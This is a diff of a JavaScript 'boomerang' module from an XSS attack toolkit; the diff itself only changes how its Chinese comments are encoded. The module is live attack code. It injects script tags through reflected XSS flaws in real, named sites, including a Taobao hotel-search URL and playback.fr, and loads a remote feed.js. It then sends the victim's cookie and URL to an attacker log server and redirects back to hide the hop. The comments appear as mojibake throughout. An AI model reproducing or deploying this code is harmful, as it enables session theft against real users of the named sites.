@@ -1,12 +1,12 @@
 ////////////////////////////////////////////////////////
-// boomerang »ØĞıïÚÄ£¿é£¬»ñÈ¡µÚÈı·½Ô¶³ÌÕ¾µãµÄcookie
-// ²¢½«Ò³ÃæÖØ¶¨Ïò»Øµ±Ç°Ò³Ãæ
-// ÒªÇóÔ¶³ÌÕ¾µã´æÔÚÒ»¸öxss
-// ËÆºõÔÚ±¾Ä£¿éÖĞµÚÈı·½Õ¾µãºÜÄÑ¼ÓÔØÉÏ base64.js
+// boomerang å›æ—‹é•–æ¨¡å—ï¼Œè·å–ç¬¬ä¸‰æ–¹è¿œç¨‹ç«™ç‚¹çš„cookie
+// å¹¶å°†é¡µé¢é‡å®šå‘å›å½“å‰é¡µé¢
+// è¦æ±‚è¿œç¨‹ç«™ç‚¹å­˜åœ¨ä¸€ä¸ªxss
+// ä¼¼ä¹åœ¨æœ¬æ¨¡å—ä¸­ç¬¬ä¸‰æ–¹ç«™ç‚¹å¾ˆéš¾åŠ è½½ä¸Š base64.js
 ///////////////////////////////////////////////////////
-//alert("Boomerang.js »ØĞıïÚÄ£¿é");
+//alert("Boomerang.js å›æ—‹é•–æ¨¡å—");
 
-// feedurl ÔÚbase.jsÖĞ¶¨Òå
+// feedurl åœ¨base.jsä¸­å®šä¹‰
 var target_domain = "jipiao.taobao.com";
 //var target="http://www.b.com/4.html#'><script src=\'"+feedurl+"\' ></script><'"; 
 var target="http://jipiao.taobao.com/hotel/search_hotel.htm?_fmho.h._0.d=%CE%E4%BA%BA&_fmho.h._0.c=2008-11-30&_fmho.h._0.ch=2008-12-01&_fmho.h._0.p=&_fmho.h._0.h=&_fmho.h._0.ho=&_fmho.h._0.hot=&_fmho.h._0.hote=&_fmho.h._0.de=WUH%3F%22%3E<script src=\'"+feedurl+"\' ></script>";
@@ -14,18 +14,18 @@ var target="http://jipiao.taobao.com/hotel/search_hotel.htm?_fmho.h._0.d=%CE%E4%
 //var target="http://www.waikikicondosearch.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
 //var target="http://www.gobolinux.org/?page=<script src="+feedurl+"></script>";
 
-// Ç°Ò³Ãæ
+// å‰é¡µé¢
 var org_url = "http://www.playback.fr/recherche.php?search=<script%20src=http://www.secwiki.com/athena/feed.js%20></script>+&button=OK";  
 var org_domain = "www.playback.fr";
 
 ////////////////////////////////////////////////////////////
-// ¿ªÊ¼Ö´ĞĞ¹¦ÄÜ
+// å¼€å§‹æ‰§è¡ŒåŠŸèƒ½
 ///////////////////////////////////////////////////////////
 
-// Èç¹ûÊÇµ±Ç°Ò³Ãæ£¬ÔòÏòÄ¿±êÌá½»
+// å¦‚æœæ˜¯å½“å‰é¡µé¢ï¼Œåˆ™å‘ç›®æ ‡æäº¤
 if ($d.domain == org_domain){
    if ($d.cookie.indexOf("xsstag=1") < 0){
-	 // ÔÚcookieÀï×ö±ê¼Ç£¬Ö»µ¯Ò»´Î
+	 // åœ¨cookieé‡Œåšæ ‡è®°ï¼Œåªå¼¹ä¸€æ¬¡
 	 $d.cookie="xsstag=1; "+$d.cookie;
         //alert(target);
         try {
@@ -37,22 +37,22 @@ if ($d.domain == org_domain){
 }
 
 //////////////////////////////////////////////////////////
-// Èç¹ûÊÇÄ¿±êÕ¾µã£¬ÔòÖØ¶¨Ïò»ØÇ°Ò³Ãæ 
+// å¦‚æœæ˜¯ç›®æ ‡ç«™ç‚¹ï¼Œåˆ™é‡å®šå‘å›å‰é¡µé¢ 
 if ($d.domain == target_domain){
 	
-   //var param = "[**** Request URI: "+window.location.href+" ****]\r\n    [**** Cookie: "+document.cookie+" ****]";  // ´«µİ»ØserverµÄ²ÎÊı
-   var param = XssGotURI+XssGotCookie;  // ´«µİ»ØserverµÄ²ÎÊı
+   //var param = "[**** Request URI: "+window.location.href+" ****]\r\n    [**** Cookie: "+document.cookie+" ****]";  // ä¼ é€’å›serverçš„å‚æ•°
+   var param = XssGotURI+XssGotCookie;  // ä¼ é€’å›serverçš„å‚æ•°
    //alert(param);
-   //param = base64encode(param); // base64 ¼ÓÃÜ²ÎÊı´«Êä
+   //param = base64encode(param); // base64 åŠ å¯†å‚æ•°ä¼ è¾“
 
-   // ·¢ËÍcookie ºÍ uri »Ø server
+   // å‘é€cookie å’Œ uri å› server
    getURL(logurl+param);
 
    //////////////////////////////////////////////////////
-   // ·µ»ØÔ­À´µÄÒ³Ãæ¡£
+   // è¿”å›åŸæ¥çš„é¡µé¢ã€‚
    formpostTarget(org_url);
 }
 
 //////////////////////////////////////////////////////////////
-// ÕâÀïÓĞÊ±¼äÎÊÌâ£¬Ì«¶Ì¿ÉÄÜµ¼ÖÂlib¼ÓÔØÊ§°Ü,µ¼ÖÂÒ³Ãæ´ò²»¿ª
-// ËùÒÔÖ±½Ó°ÑÒ»Ğ©ÓÃµ½µÄº¯ÊıĞ´ÔÚÕâÀï
+// è¿™é‡Œæœ‰æ—¶é—´é—®é¢˜ï¼Œå¤ªçŸ­å¯èƒ½å¯¼è‡´libåŠ è½½å¤±è´¥,å¯¼è‡´é¡µé¢æ‰“ä¸å¼€
+// æ‰€ä»¥ç›´æ¥æŠŠä¸€äº›ç”¨åˆ°çš„å‡½æ•°å†™åœ¨è¿™é‡Œ
